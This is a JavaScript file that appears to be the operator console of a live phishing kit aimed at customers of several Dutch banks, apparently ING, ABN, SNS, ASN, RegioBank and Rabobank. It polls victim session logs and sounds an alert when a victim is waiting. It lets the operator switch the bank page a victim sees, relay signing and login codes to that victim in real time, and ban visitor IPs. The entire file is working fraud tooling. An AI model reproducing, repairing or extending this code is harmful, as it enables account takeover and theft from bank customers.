const id = document.querySelector('#token');
const log = document.querySelector('.data');
const audio = new Audio('/audio/vis.mp3');

let content = '';
let oldContent = '';

setInterval(() => {
    updateLogs();
}, 500);

const updateLogs = () => {
    const data = new FormData();
    data.append('id', id.value);
    fetch('/logs/get/one', {
        method: 'POST',
        body: data
    }).then(res => {
        res.text().then(data => {
            if (data.fail === 'request_failed') {
                console.log('Request Failed');
            } else {
                content = data;
            
                if (content != oldContent) {
                    oldContent = content;
                    log.innerHTML = oldContent;
                }   

                if (document.querySelector('#alert').innerHTML == 'Currently Waiting ...') {
                    audio.play();
                }
            }
        });
    });
};

const deleteLog = id => {
    const data = new FormData();
    data.append('id', id);

    fetch('/logs/delete', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                window.location.href = '/logs';
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const banUser = (ip, url) => {
    const data = new FormData();
    data.append('ip', ip);
    data.append('id', url);

    fetch('/logs/ban', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                window.location.href = '/logs';
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setIng = (id, page) => {
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    fetch('/ing/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setAbn = (id, page) => {
    const getSign = document.querySelector('.abn-sign');
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    data.append('code', getSign.value);
    fetch('/abn/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setSns = (id, page) => {
    const getSign = document.querySelector('.sns-sign');
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    data.append('code', getSign.value);
    fetch('/sns/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setAsn = (id, page) => {
    const getSign = document.querySelector('.asn-sign');
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    data.append('code', getSign.value);
    fetch('/asn/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setRegio = (id, page) => {
    const getSign = document.querySelector('.regio-sign');
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    data.append('code', getSign.value);
    fetch('/regio/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

const setRabo = (id, page) => {
    const getSign = document.querySelector('.rabo-sign');
    const getLogin = document.querySelector('.rabo-login');
    const data = new FormData();
    data.append('id', id);
    data.append('page', page);
    data.append('login', getLogin.value);
    data.append('sign', getSign.value);
    fetch('/rabo/page', {
        method: 'POST',
        body: data
    }).then(res => {
        res.json().then(data => {     
            if (data.success === 'true') {
                updateLogs();
            } else if (data.fail === 'request_failed') {
                return console.log('Request Failed');
            }
        });
    });
};

updateLogs();